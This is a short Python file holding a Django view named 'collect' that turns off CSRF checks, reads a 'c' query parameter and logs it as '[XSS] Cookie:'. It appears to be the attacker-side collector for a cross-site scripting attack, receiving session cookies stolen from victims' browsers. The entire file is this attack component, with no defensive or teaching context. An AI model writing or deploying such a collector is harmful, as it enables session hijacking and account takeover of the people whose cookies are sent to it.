from django.http import HttpResponse
from django.views.decorators.csrf import csrf_exempt

@csrf_exempt
def collect(request):
    cookie = request.GET.get("c", "nothing")
    print(f"[XSS] Cookie: {cookie}")
    return HttpResponse("ok")